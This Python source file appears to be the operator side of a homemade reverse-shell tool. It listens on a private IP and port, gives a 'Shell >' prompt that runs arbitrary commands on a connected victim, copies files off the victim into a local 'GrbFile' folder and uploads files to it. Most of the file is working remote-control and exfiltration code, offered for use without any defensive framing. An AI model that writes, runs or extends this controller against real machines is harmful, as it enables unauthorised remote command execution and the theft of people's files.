import socket
import os
from fileinput import filename
from tabnanny import check


def letGrab(connection, cmd, operation):
    try:
        connection.send(cmd.encode()) #send command to client
        if operation == "grab":
            parts = cmd.split("*")
            if len(parts) < 2:
                print("[+]  Invalid grab command")
                return
            grab, sourcePathFileName = parts
            path = "/home/zimm/Desktop/GrbFile/"
            os.makedirs(path, exist_ok=True)
            fileName = "grabbed_" + os.path.basename(sourcePathFileName)

        file_path = os.path.join(path, fileName)
        with open(file_path, 'ab') as f:
            while True:
                bits = connection.recv(5000)
                if not bits:
                    break
                if bits.endswith(b"DONE"):
                    f.write(bits[:-4])
                    print("[+] Transfer complete")
                    break
                if b'File not found' in bits:
                    print("[-] transfer failed")
                    return
                f.write(bits)
            print(f"File saved as{fileName}")
            print(f"Location is {path}")
    except Exception as e:
        print(f"[-] Error in file transfer: ")

def doSend(conn, sourcePath, destinationPath, fileName):
    try:
        full_path= os.path.join(sourcePath, fileName)
        print(f"[~] Looking 4 File: {full_path} ")
        # Checking if file exists
        if not os.path.isfile(full_path):
            conn.send(b"[-] File not found")
            print(f"[-] File does not exist: {full_path}")
            return

        #check if file is not empty
        if os.path.getsize(full_path) == 0:
            conn.send(b"[~] File is empty")
            print(f"[-] File is empty: {full_path}")
            return
        # send file data
        with open(full_path, 'rb') as sourceFile:
            while True:
                packet = sourceFile.read(1024)
                if not packet:
                    break
                conn.send(packet)
            conn.send(b'DONE')
            print("[+] File Transfer Complete")
    except Exception as e:
        conn.send(b'File transfer error')
        print(f"[-] Error during file send: {str(e)}")

                #  REPEATE OF WHAT WE DID BEFORE
    # if os.path.exists(sourcePath + fileName):
    #     sourceFile = open(sourcePath + fileName, 'rb')
    #     packet = sourceFile.read(1024)
    #     while len(packet) > 0:
    #         conn.send(packet)
    #     conn.send('DONE'.encode())
    #     print("[+] File Transfer Complete")
    # else:
    #     conn.send("File not found".encode())
    #     print('[-] Unable to find the file')
    #     return
    #
def connect():
    mysocket = socket.socket()
    mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    mysocket.bind(("192.168.159.134",8080))
    mysocket.listen(1)
    conn, address = mysocket.accept()
    print("Connection established successfully",address)

    while True:
        try:
            userinput = input("Shell > ")
            if "term" in userinput:
                conn.send("term".encode())
                conn.close()
                break

            elif userinput.startswith("grab"):
                letGrab(conn, userinput, "grab")

            elif 'send' in userinput:
                sendCmd, destination, fileName = userinput.split("*")
                source = input("Scource path: ")
                conn.send(userinput.encode())
                doSend(conn, source, destination, fileName)

            else:
                conn.send(userinput.encode())
                responce = conn.recv(5000).decode(errors="ignore")
                print(responce)

        except Exception as e:
            print(f"[-] Error {e}")
            break


def main():
    connect()
if __name__ == "__main__":
    main()
